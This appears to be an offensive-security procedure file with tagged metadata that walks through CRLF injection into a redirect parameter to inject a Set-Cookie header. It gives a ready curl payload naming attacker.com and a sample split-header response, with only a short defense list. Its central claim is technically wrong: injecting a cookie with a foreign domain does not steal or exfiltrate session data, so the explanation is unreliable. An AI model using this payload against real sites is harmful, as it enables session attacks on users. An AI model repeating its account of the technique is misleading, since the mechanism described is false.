---
id: 850c463b-336d-4708-aa49-07c1ce642368
name: crlf-injection-for-cookie-stealing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:55.277219+00:00'
updated_at: '2023-04-06T03:55:55.291888+00:00'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
tags:
  - crlf-injection
  - cookie-stealing
  - http-response-splitting
  - web-session-hijacking
commands:
  - '[[commands/curl-send-crlf-injection-request]]'
platforms:
  - Web
tools: []
validated: true
---

# CRLF Injection for Cookie Stealing

## Summary

This procedure demonstrates how to perform a CRLF injection attack to manipulate HTTP response headers and inject a malicious Set-Cookie directive, enabling the theft of the victim's session cookies. By appending CRLF sequences (%0D%0A) to user-controlled parameters in HTTP requests, attackers can split responses and add arbitrary headers, leading to session hijacking and unauthorized access.

## Description

CRLF injection exploits applications that fail to sanitize user input in HTTP headers, allowing attackers to inject carriage return and line feed characters to terminate existing headers and append new ones. In this scenario, the attack targets a vulnerable web application endpoint (e.g., a redirect or error page) where a parameter like a URL or message is reflected into the Location or other response headers without proper encoding. The injected Set-Cookie header sets a malicious cookie on the victim's browser, which can capture and exfiltrate session data. This technique is effective against applications using outdated HTTP handling libraries and can bypass basic security controls if cookies lack HttpOnly or Secure flags. It requires an authenticated or public-facing endpoint and is commonly tested during web penetration assessments.

## Requirements

1. Access to a vulnerable web application with reflected parameters in HTTP response headers (e.g., Location header in redirects).
2. A proxy tool like Burp Suite to intercept and modify requests.
3. Network connectivity to the target server.
4. Basic knowledge of HTTP protocol and URL encoding.

## Defense

- Implement strict input validation and sanitization to reject or encode CRLF characters (%0D%0A) in user-supplied data.
- Use secure cookie attributes: Set HttpOnly and Secure flags to prevent client-side access and transmission over unencrypted channels.
- Deploy web application firewalls (WAFs) to detect and block anomalous header injections.
- Monitor server logs and network traffic for unusual response patterns, such as multiple Set-Cookie headers or unexpected redirects.

## Objectives

1. Inject a CRLF sequence into a user-controlled parameter to split the HTTP response.
2. Append a malicious Set-Cookie header to steal or manipulate the victim's session cookies.
3. Capture the modified response to verify session hijacking potential.

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate an endpoint that reflects user input directly into response headers without sanitization, such as a search or redirect function. Use manual testing or automated scanners to confirm CRLF injection points.

**Command** (Use a standard reconnaissance tool like curl to test basic reflection):

Refer to [[commands/curl-send-basic-request]] for initial probing, but adapt for your target.

> Send a GET request to the suspected endpoint with a benign payload to observe header reflection. Look for parameters like 'url', 'redirect', or 'message' in the response.

### Step 2: Craft and Send Injected Request

**Context**: Construct the payload by appending %0D%0A followed by the Set-Cookie directive to the injectable parameter. This terminates the legitimate header and injects a new one, setting a cookie that can exfiltrate session data to an attacker-controlled domain.

**Code** ([[codes/crlf-injection-url-payload]]):

The payload is embedded in the URL parameter.

**Command** ([[commands/curl-send-crlf-injection-request]]):
```bash
curl -X GET "http://www.example.net/vulnerable?redirect=http%3A%2F%2Fwww.example.net%2F%0D%0ASet-Cookie%3A%20session%3Dmalicious_value%3B%20Domain%3Dattacker.com%0D%0A" -v
```

> This command sends a GET request with the CRLF-injected payload in the 'redirect' parameter. The -v flag enables verbose output to inspect headers. The %0D%0A sequence splits the Location header, injecting Set-Cookie: session=malicious_value; Domain=attacker.com, which sets the cookie on the victim's browser and potentially sends session data to the attacker.

### Step 3: Capture and Verify Response

**Context**: Intercept the server's response to confirm the injection succeeded. The response should include the injected Set-Cookie header, allowing the attacker to hijack the session by using the stolen cookie value.

Monitor the response headers for the presence of the malicious Set-Cookie. If successful, the victim's browser will receive and store the injected cookie, enabling session impersonation.

> Expected response includes split headers like:

Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/
Set-Cookie: session=malicious_value; Domain=attacker.com
X-Frame-Options: SAMEORIGIN

Success is indicated by the appearance of the custom Set-Cookie header in the response.
